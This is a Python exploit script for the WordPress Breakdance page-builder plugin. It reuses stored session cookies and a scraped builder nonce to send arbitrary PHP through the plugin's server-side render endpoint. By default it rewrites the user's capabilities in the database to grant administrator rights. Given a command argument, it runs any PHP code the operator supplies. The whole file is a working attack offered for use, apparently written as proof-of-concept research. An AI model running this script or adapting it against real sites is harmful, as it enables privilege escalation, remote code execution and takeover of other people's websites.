#!/usr/bin/python3
import requests, sys, pickle, re
from bs4 import BeautifulSoup

# Requirements?

# Args =)
if len(sys.argv) > 1:
    host=sys.argv[1]
else:
    host="https://bd.blueteamer.io"
if len(sys.argv) > 2:
    evil_cmd=sys.argv[2]
    files = {
        'action': (None, 'breakdance_server_side_render'),
        'properties': (None, '{"content":{"content":{"php_code":"'+evil_cmd+'"}}}'),
        'parentProperties': (None, '{}'),
        'elementSlug': (None, 'EssentialElements\\CodeBlock'),
        'triggeringDocument': (None, '13'),
        'breakdance_ajax_at_any_url': (None, 'true'),
    }
else:
    files = {
        'action': (None, 'breakdance_server_side_render'),
        'properties': (None, '{"content":{"content":{"php_code":"<?php $admin_id=get_current_user_id(); $a=\'a:1:{s:13:\\\\\\"administrator\\\\\\";s:1:\\\\\\"1\\\\\\";}\'; global $wpdb; $wpdb->query(\\"UPDATE wp_usermeta SET meta_value=\'{$a}\' WHERE meta_key=\'wp_capabilities\' AND user_id=\'{$admin_id}\';\\"); echo \\"priv esc of user: ($admin_id), db error (if any):\\".$wpdb->last_error; ?>"}}}'),
        'parentProperties': (None, '{}'),
        'elementSlug': (None, 'EssentialElements\\CodeBlock'),
        'triggeringDocument': (None, '13'),
        'breakdance_ajax_at_any_url': (None, 'true'),
    }


# Cookie helpers
def save_cookies(requests_cookiejar, filename):
    with open(filename, 'wb') as f:
        pickle.dump(requests_cookiejar, f)

def load_cookies(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

# Nonce helper
def get_nonce_builder(host):
    html_data = requests.get(host+"/?breakdance=builder&id=13", cookies=load_cookies("_cookies")) #admin 
    nonce = re.search('ajaxnonce":"(.*?)",', str(html_data.text))
    return nonce.group(1)

# Attack Nonce
nonce_builder = get_nonce_builder(host)

# Attack render_element
path="/"
url=host+path

headers = {
    'x-requested-with': 'BreakdanceXMLHttpRequest',
}

params = {
    'page_id': '13',
    '_breakdance_doing_ajax': 'yes',
    '_ajax_nonce': nonce_builder,
}



print("Attacking: ", host)
print("With builder nonce:", nonce_builder)
res = requests.post(url, params=params, cookies=load_cookies('_cookies'), headers=headers, files=files)
if res.status_code == 200:
    php_result = re.search('html":"(.*?)",', str(res.text))
    print("#######################")
    #print(php_result[1])
    print(res.text)
    print("#######################")
    print("Code executed")
#    print(res.text)
else:
    print(res.text)
    print("#######################")
    print("There was an error")
